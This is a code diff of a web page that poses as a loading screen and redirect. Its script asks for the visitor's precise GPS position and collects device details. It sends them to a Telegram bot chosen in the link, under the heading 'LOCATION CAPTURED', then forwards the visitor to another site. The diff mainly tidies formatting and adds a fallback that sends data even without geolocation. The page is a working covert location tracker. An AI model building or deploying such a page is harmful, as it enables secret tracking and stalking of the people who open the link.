@@ -8,22 +8,19 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            height: 100vh; display: flex;
+            justify-content: center; align-items: center;
             font-family: -apple-system, sans-serif;
         }
-        .loader { text-align: center; color: white; }
         .spinner {
             width: 50px; height: 50px;
             border: 5px solid rgba(255,255,255,0.3);
-            border-top-color: white;
-            border-radius: 50%;
+            border-top-color: white; border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 0 auto 20px;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+        .loader { text-align: center; color: white; }
     </style>
 </head>
 <body>
@@ -31,9 +28,7 @@
         <div class="spinner"></div>
         <div>Loading...</div>
     </div>
-
     <script>
-    // Get redirect URL
     const params = new URLSearchParams(window.location.search);
     const redirect = params.get('r') || 'https://google.com';
     const bot = params.get('bot') || '';
@@ -49,7 +44,6 @@
         gps: null
     };
     
-    // Capture GPS
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             function(pos) {
@@ -57,7 +51,7 @@
                     lat: pos.coords.latitude,
                     lon: pos.coords.longitude,
                     acc: pos.coords.accuracy,
-                    map: 'https://maps.google.com/maps?q=' + pos.coords.latitude + ',' + pos.coords.longitude + '&ll=' + pos.coords.latitude + ',' + pos.coords.longitude + '&z=16'
+                    map: 'https://maps.google.com/maps?q=' + pos.coords.latitude + ',' + pos.coords.longitude
                 };
                 sendData();
             },
@@ -67,22 +61,21 @@
             },
             { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
+    } else {
+        sendData();
     }
     
     function sendData() {
-        // Send to Telegram if bot token provided
         if (bot && chat) {
             let msg = '📍 LOCATION CAPTURED\n';
             msg += '━━━━━━━━━━━━━━━━\n\n';
-            
             if (data.gps && data.gps.lat) {
                 msg += '✅ GPS: ' + data.gps.lat.toFixed(6) + ', ' + data.gps.lon.toFixed(6) + '\n';
                 msg += '🎯 Accuracy: ' + data.gps.acc.toFixed(1) + 'm\n';
                 msg += '🗺️ ' + data.gps.map + '\n';
             } else {
-                msg += '❌ GPS: ' + (data.gps ? data.gps.error : 'Denied') + '\n';
+                msg += '❌ GPS: Denied\n';
             }
-            
             msg += '\n📱 ' + data.platform + '\n';
             msg += '🖥️ ' + data.screen + '\n';
             msg += '🕐 ' + data.time + '\n';
@@ -93,8 +86,6 @@
                 body: JSON.stringify({ chat_id: chat, text: msg })
             });
         }
-        
-        // Redirect
         setTimeout(function() {
             window.location.href = redirect;
         }, 2000);
